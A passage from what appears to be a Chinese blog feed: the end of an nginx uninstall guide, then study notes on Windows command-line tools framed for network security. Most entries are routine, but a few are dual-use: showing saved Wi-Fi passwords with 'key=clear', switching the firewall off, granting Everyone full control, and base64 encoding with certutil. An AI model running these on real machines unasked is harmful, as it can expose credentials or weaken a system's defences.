&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 停止服务&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>root@centos7-test ~&lt;span class="o">]&lt;/span>&lt;span class="c1"># systemctl stop nginx&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 删除服务文件&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>root@centos7-test ~&lt;span class="o">]&lt;/span>&lt;span class="c1"># rm -f /etc/systemd/system/nginx.service&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 重新加载systemd配置&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>root@centos7-test ~&lt;span class="o">]&lt;/span>&lt;span class="c1"># systemctl daemon-reload&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 删除安装目录&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>root@centos7-test ~&lt;span class="o">]&lt;/span>&lt;span class="c1"># rm -rf /usr/local/nginx&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ol>
&lt;hr>
&lt;p>通过以上步骤，你可以通过RPM、YUM或编译安装的方式安装和卸载nginx软件。每种方式各有优缺点，可以根据实际需求选择合适的安装与卸载方法。&lt;/p></description></item><item><title>基础dos命令</title><link>https://souljian.cn/p/746091956/</link><pubDate>Thu, 01 May 2025 17:32:36 +0800</pubDate><guid>https://souljian.cn/p/746091956/</guid><description>&lt;p>好的，以下是根据文件内容整理的完整笔记，包含所有命令及其说明和实例，采用Markdown格式：&lt;/p>
&lt;h1 id="网络安全相关dos命令笔记">网络安全相关DOS命令笔记
&lt;/h1>&lt;h2 id="1-网络配置与诊断命令">1. 网络配置与诊断命令
&lt;/h2>&lt;h3 id="11-ipconfig">1.1 &lt;code>ipconfig&lt;/code>
&lt;/h3>&lt;ul>
&lt;li>&lt;strong>功能&lt;/strong>：查看和管理网络配置信息。&lt;/li>
&lt;li>&lt;strong>常用参数&lt;/strong>：
&lt;ul>
&lt;li>&lt;code>ipconfig&lt;/code>：查看当前网络适配器的IP地址。&lt;/li>
&lt;li>&lt;code>ipconfig /all&lt;/code>：显示所有网络接口的详细信息，包括IP地址、子网掩码、默认网关、DNS服务器、MAC地址等。&lt;/li>
&lt;li>&lt;code>ipconfig /flushdns&lt;/code>：清除DNS解析缓存。&lt;/li>
&lt;li>&lt;code>ipconfig /displaydns&lt;/code>：显示DNS解析缓存的内容。&lt;/li>
&lt;li>&lt;code>ipconfig /renew&lt;/code>：更新（或重新获取）所有适配器的IP设置参数。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>实例&lt;/strong>：
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ipconfig /all
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ipconfig /flushdns
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="12-ping">1.2 &lt;code>ping&lt;/code>
&lt;/h3>&lt;ul>
&lt;li>&lt;strong>功能&lt;/strong>：测试网络连接是否正常。&lt;/li>
&lt;li>&lt;strong>常用参数&lt;/strong>：
&lt;ul>
&lt;li>&lt;code>ping [网址]&lt;/code>：发送默认大小（Windows为32字节，Linux为56字节）的ICMP数据包。&lt;/li>
&lt;li>&lt;code>ping -t [网址]&lt;/code>：持续ping目标地址。&lt;/li>
&lt;li>&lt;code>ping -n [次数] [网址]&lt;/code>：指定ping的次数。&lt;/li>
&lt;li>&lt;code>ping -l [大小] [网址]&lt;/code>：指定ping包的大小。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>实例&lt;/strong>：
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ping -n &lt;span class="m">5&lt;/span> www.baidu.com
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ping -l &lt;span class="m">1024&lt;/span> www.baidu.com
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="13-tracert">1.3 &lt;code>tracert&lt;/code>
&lt;/h3>&lt;ul>
&lt;li>&lt;strong>功能&lt;/strong>：追踪网络路由节点。&lt;/li>
&lt;li>&lt;strong>实例&lt;/strong>：
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">tracert www.baidu.com
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="14-pathping">1.4 &lt;code>pathping&lt;/code>
&lt;/h3>&lt;ul>
&lt;li>&lt;strong>功能&lt;/strong>：结合&lt;code>ping&lt;/code>和&lt;code>tracert&lt;/code>的功能，显示网络延迟和丢包信息。&lt;/li>
&lt;li>&lt;strong>实例&lt;/strong>：
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">pathping www.baidu.com
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="15-netstat">1.5 &lt;code>netstat&lt;/code>
&lt;/h3>&lt;ul>
&lt;li>&lt;strong>功能&lt;/strong>：显示网络连接信息。&lt;/li>
&lt;li>&lt;strong>常用参数&lt;/strong>：
&lt;ul>
&lt;li>&lt;code>netstat -a&lt;/code>：显示所有连接和监听端口。&lt;/li>
&lt;li>&lt;code>netstat -r&lt;/code>：显示路由信息。&lt;/li>
&lt;li>&lt;code>netstat -p [协议类型]&lt;/code>：显示特定协议的连接。&lt;/li>
&lt;li>&lt;code>netstat -ano&lt;/code>：显示网络连接的全面信息，包括进程ID。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>实例&lt;/strong>：
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">netstat -anop tcp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">netstat -an &lt;span class="p">|&lt;/span> find &lt;span class="s2">&amp;#34;80&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="16-nslookup">1.6 &lt;code>nslookup&lt;/code>
&lt;/h3>&lt;ul>
&lt;li>&lt;strong>功能&lt;/strong>：查询DNS解析域名的IP地址。&lt;/li>
&lt;li>&lt;strong>实例&lt;/strong>：
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nslookup www.baidu.com
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="17-netsh">1.7 &lt;code>netsh&lt;/code>
&lt;/h3>&lt;ul>
&lt;li>&lt;strong>功能&lt;/strong>：配置和显示网络设置。&lt;/li>
&lt;li>&lt;strong>常用命令&lt;/strong>：
&lt;ul>
&lt;li>&lt;code>netsh interface show interface&lt;/code>：显示网络接口信息。&lt;/li>
&lt;li>&lt;code>netsh advfirewall set allprofiles state on/off&lt;/code>：启用/禁用防火墙。&lt;/li>
&lt;li>&lt;code>netsh wlan show profiles&lt;/code>：显示无线网络配置文件。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>实例&lt;/strong>：
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">netsh interface show interface
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">netsh advfirewall &lt;span class="nb">set&lt;/span> allprofiles state on
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">netsh wlan show profiles
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="18-netsh-interface-ip-set-address">1.8 &lt;code>netsh interface ip set address&lt;/code>
&lt;/h3>&lt;ul>
&lt;li>&lt;strong>功能&lt;/strong>：设置网络接口的IP地址。&lt;/li>
&lt;li>&lt;strong>实例&lt;/strong>：
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">netsh interface ip &lt;span class="nb">set&lt;/span> address &lt;span class="nv">name&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;Local Area Connection&amp;#34;&lt;/span> static 192.168.1.10 255.255.255.0 192.168.1.1
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">netsh interface ip &lt;span class="nb">set&lt;/span> address &lt;span class="nv">name&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;Local Area Connection&amp;#34;&lt;/span> &lt;span class="nv">source&lt;/span>&lt;span class="o">=&lt;/span>dhcp
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="19-netsh-advfirewall-firewall-add-rule">1.9 &lt;code>netsh advfirewall firewall add rule&lt;/code>
&lt;/h3>&lt;ul>
&lt;li>&lt;strong>功能&lt;/strong>：添加防火墙规则。&lt;/li>
&lt;li>&lt;strong>实例&lt;/strong>：
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">netsh advfirewall firewall add rule &lt;span class="nv">name&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;Allow Program&amp;#34;&lt;/span> &lt;span class="nv">dir&lt;/span>&lt;span class="o">=&lt;/span>in &lt;span class="nv">action&lt;/span>&lt;span class="o">=&lt;/span>allow &lt;span class="nv">program&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;C:\path\to\program.exe&amp;#34;&lt;/span> &lt;span class="nv">enable&lt;/span>&lt;span class="o">=&lt;/span>yes
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">netsh advfirewall firewall add rule &lt;span class="nv">name&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;Allow Inbound TCP 22&amp;#34;&lt;/span> &lt;span class="nv">dir&lt;/span>&lt;span class="o">=&lt;/span>in &lt;span class="nv">action&lt;/span>&lt;span class="o">=&lt;/span>allow &lt;span class="nv">protocol&lt;/span>&lt;span class="o">=&lt;/span>TCP &lt;span class="nv">localport&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">22&lt;/span> &lt;span class="nv">enable&lt;/span>&lt;span class="o">=&lt;/span>yes
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="110-netsh-wlan-connect-和-netsh-wlan-delete-profile">1.10 &lt;code>netsh wlan connect&lt;/code> 和 &lt;code>netsh wlan delete profile&lt;/code>
&lt;/h3>&lt;ul>
&lt;li>&lt;strong>功能&lt;/strong>：
&lt;ul>
&lt;li>&lt;code>netsh wlan connect name=&amp;quot;SSID&amp;quot;&lt;/code>：连接到无线网络。&lt;/li>
&lt;li>&lt;code>netsh wlan delete profile name=&amp;quot;SSID&amp;quot;&lt;/code>：删除无线网络配置文件。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>实例&lt;/strong>：
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">netsh wlan connect &lt;span class="nv">name&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;MyWiFi&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">netsh wlan delete profile &lt;span class="nv">name&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;MyWiFi&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="111-netsh-interface-ip-show-route-和-netsh-interface-ip-add-route">1.11 &lt;code>netsh interface ip show route&lt;/code> 和 &lt;code>netsh interface ip add route&lt;/code>
&lt;/h3>&lt;ul>
&lt;li>&lt;strong>功能&lt;/strong>：
&lt;ul>
&lt;li>&lt;code>netsh interface ip show route&lt;/code>：显示路由表。&lt;/li>
&lt;li>&lt;code>netsh interface ip add route&lt;/code>：添加静态路由。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>实例&lt;/strong>：
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">netsh interface ip show route
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">netsh interface ip add route 192.168.2.0/24 &lt;span class="s2">&amp;#34;Local Area Connection&amp;#34;&lt;/span> 192.168.1.1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="112-netsh-wlan-show-profile">1.12 &lt;code>netsh wlan show profile&lt;/code>
&lt;/h3>&lt;ul>
&lt;li>&lt;strong>功能&lt;/strong>：显示无线网络配置文件的详细信息，包括密码。&lt;/li>
&lt;li>&lt;strong>常用命令&lt;/strong>：
&lt;ul>
&lt;li>&lt;code>netsh wlan show profile&lt;/code>：显示所有配置文件。&lt;/li>
&lt;li>&lt;code>netsh wlan show profile name=&amp;quot;[SSID]&amp;quot; key=clear&lt;/code>：显示特定配置文件的密码。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>实例&lt;/strong>：
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">netsh wlan show profile
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">netsh wlan show profile &lt;span class="nv">name&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;WiFi-Name&amp;#34;&lt;/span> &lt;span class="nv">key&lt;/span>&lt;span class="o">=&lt;/span>clear
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="113-cipher">1.13 &lt;code>cipher&lt;/code>
&lt;/h3>&lt;ul>
&lt;li>&lt;strong>功能&lt;/strong>：显示或更改NTFS分区上的文件和文件夹的加密状态。&lt;/li>
&lt;li>&lt;strong>常用参数&lt;/strong>：
&lt;ul>
&lt;li>&lt;code>cipher /e [目录或文件]&lt;/code>：加密指定的文件或目录。&lt;/li>
&lt;li>&lt;code>cipher /d [目录或文件]&lt;/code>：解密指定的文件或目录。&lt;/li>
&lt;li>&lt;code>cipher /s:[目录]&lt;/code>：对指定目录及其所有子目录进行操作。&lt;/li>
&lt;li>&lt;code>cipher /k&lt;/code>：创建新的文件加密密钥。&lt;/li>
&lt;li>&lt;code>cipher /r:[文件名]&lt;/code>：生成恢复证书和私钥。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>实例&lt;/strong>：
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">cipher /e D:&lt;span class="se">\S&lt;/span>ecretFiles
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cipher /d D:&lt;span class="se">\D&lt;/span>ecryptedFiles
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cipher /s:C:&lt;span class="se">\I&lt;/span>mportantData
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="114-whoami">1.14 &lt;code>whoami&lt;/code>
&lt;/h3>&lt;ul>
&lt;li>&lt;strong>功能&lt;/strong>：显示当前用户的用户名、组成员资格和权限信息。&lt;/li>
&lt;li>&lt;strong>常用参数&lt;/strong>：
&lt;ul>
&lt;li>&lt;code>whoami /user&lt;/code>：显示当前用户名和SID。&lt;/li>
&lt;li>&lt;code>whoami /groups&lt;/code>：显示用户所属组。&lt;/li>
&lt;li>&lt;code>whoami /priv&lt;/code>：显示当前用户的所有权限。&lt;/li>
&lt;li>&lt;code>whoami /all&lt;/code>：显示所有用户信息。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>实例&lt;/strong>：
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">whoami
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">whoami /user
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">whoami /groups
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">whoami /priv
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="115-runas">1.15 &lt;code>runas&lt;/code>
&lt;/h3>&lt;ul>
&lt;li>&lt;strong>功能&lt;/strong>：以其他用户身份运行命令或程序。&lt;/li>
&lt;li>&lt;strong>常用命令&lt;/strong>：
&lt;ul>
&lt;li>&lt;code>runas /user:[域名\用户名] [程序]&lt;/code>：以指定用户身份运行程序。&lt;/li>
&lt;li>&lt;code>runas /savecred /user:[域名\用户名] [程序]&lt;/code>：保存凭据并运行程序。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>实例&lt;/strong>：
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">runas /user:administrator cmd.exe
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">runas /savecred /user:domain&lt;span class="se">\u&lt;/span>sername &lt;span class="s2">&amp;#34;notepad C:\path\to\file.txt&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="116-caclsicacls">1.16 &lt;code>cacls/icacls&lt;/code>
&lt;/h3>&lt;ul>
&lt;li>&lt;strong>功能&lt;/strong>：显示或修改文件的访问控制列表（ACL）。&lt;/li>
&lt;li>&lt;strong>常用命令（icacls）&lt;/strong>：
&lt;ul>
&lt;li>&lt;code>icacls [文件或目录] /grant [用户名]:[权限]&lt;/code>：授予权限。&lt;/li>
&lt;li>&lt;code>icacls [文件或目录] /deny [用户名]:[权限]&lt;/code>：拒绝权限。&lt;/li>
&lt;li>&lt;code>icacls [文件或目录] /remove [用户名]&lt;/code>：删除用户的所有权限。&lt;/li>
&lt;li>&lt;code>icacls [文件或目录] /setowner [用户名]&lt;/code>：设置所有者。&lt;/li>
&lt;li>&lt;code>icacls [文件或目录] /inheritance:e|d|r&lt;/code>：启用、禁用或删除继承。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>实例&lt;/strong>：
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">icacls file.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">icacls folder /grant Everyone:&lt;span class="o">(&lt;/span>OI&lt;span class="o">)(&lt;/span>CI&lt;span class="o">)&lt;/span>F
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">icacls secure.txt /deny Users:F
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">icacls folder /inheritance:d
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="117-certutil">1.17 &lt;code>certutil&lt;/code>
&lt;/h3>&lt;ul>
&lt;li>&lt;strong>功能&lt;/strong>：管理证书和证书服务。&lt;/li>
&lt;li>&lt;strong>常用命令&lt;/strong>：
&lt;ul>
&lt;li>&lt;code>certutil -hashfile [文件] [算法]&lt;/code>：计算文件的哈希值。&lt;/li>
&lt;li>&lt;code>certutil -encode [源文件] [目标文件]&lt;/code>：Base64编码文件。&lt;/li>
&lt;li>&lt;code>certutil -decode [源文件] [目标文件]&lt;/code>：Base64解码文件。&lt;/li>
&lt;li>&lt;code>certutil -viewstore [存储名称]&lt;/code>：查看证书存储。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>实例&lt;/strong>：
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">certutil -hashfile file.exe MD5
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">certutil -hashfile important.zip SHA256
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">certutil -encode source.bin encoded.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">certutil -decode encoded.txt decoded.bin
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h2 id="2-远程连接与服务管理">2. 远程连接与服务管理
&lt;/h2>&lt;h3 id="21-telnet">2.1 &lt;code>telnet&lt;/code>
&lt;/h3>&lt;ul>
&lt;li>&lt;strong>功能&lt;/strong>：远程登录和管理服务器。&lt;/li>
&lt;li>&lt;strong>开启步骤&lt;/strong>：
&lt;ol>
&lt;li>服务端：在控制面板中启用Telnet服务器。&lt;/li>
&lt;li>客户端：在控制面板中启用Telnet客户端。&lt;/li>
&lt;/ol>
&lt;/li>
&lt;li>&lt;strong>连接命令&lt;/strong>：
&lt;ul>
&lt;li>&lt;code>telnet [IP地址] [端口]&lt;/code>：连接到指定IP和端口。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>实例&lt;/strong>：
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">telnet 192.168.1.100 &lt;span class="m">23&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="22-net">2.2 &lt;code>net&lt;/code>
